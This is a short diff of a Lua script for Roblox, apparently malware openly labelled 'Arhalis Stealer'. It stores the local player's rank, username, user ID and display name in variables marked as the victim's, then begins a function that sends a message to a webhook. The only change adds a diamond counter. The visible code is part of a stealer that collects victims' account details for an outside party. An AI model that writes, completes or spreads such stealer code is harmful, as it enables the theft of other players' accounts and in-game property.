@@ -19,6 +19,7 @@ _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Ran
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
+_G.Diamonds = 0
 local function sendwebhook(msg)
 local msg = {
   ["username"]= "Arhalis Stealer"
